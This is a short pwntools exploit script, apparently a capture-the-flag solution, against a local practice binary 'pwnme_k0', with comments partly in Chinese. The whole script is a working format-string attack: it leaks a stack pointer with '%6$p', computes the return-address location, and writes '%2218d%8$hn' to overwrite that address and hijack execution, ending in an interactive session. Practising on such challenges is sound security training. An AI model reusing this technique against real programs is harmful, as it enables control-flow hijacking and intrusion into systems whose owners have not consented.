from pwn import *  # sangebaimao exploit
context.log_level = "debug"
context.binary = './pwnme_k0'
sh = process("./pwnme_k0")
gdb.attach(sh)

sh.recv()
sh.sendline("user1111")  # user name
sh.recv()
sh.sendline("%6$p")  # pw # to get last RBP value using cur RBP value
sh.sendline("1")  # 1.Sh0w Account Infomation! # let %6$p work
sh.recvuntil("0x")
lastRBP = sh.recvline().strip()  # sh.recvline(): b'7fffdc7918c0\n' <class 'bytes'>
print("lastRBP:", lastRBP, type(lastRBP))
addr_of_ret_addr = int(lastRBP, 16) - 0x38  # - 0x38 之后就是 addr of ret addr
print("addr_of_ret_addr:" + hex(addr_of_ret_addr))
sh.recv()

sh.writeline("2")  # 2.Ed1t Account Inf0mation!
sh.recv()  # please input new username(max lenth:20):
sh.sendline(p64(addr_of_ret_addr))  # user name: addr_of_ret_addr
sh.recv()  # please input new password(max lenth:20):
sh.sendline("%2218d%8$hn")  # pw # 0x08aa=2218 0x08a6=2214 # 将addr_of_ret_addr上的双字节改为0x08aa
# 至此，用户名和密码已经被更改，但是还没有达到劫持返回地址的目的，即还未执行printf(usr name); printf(pw)
sh.recv()
sh.sendline("1")  # 1.Sh0w Account Infomation! # hijack ret addr HERE
sh.recv()
sh.interactive()
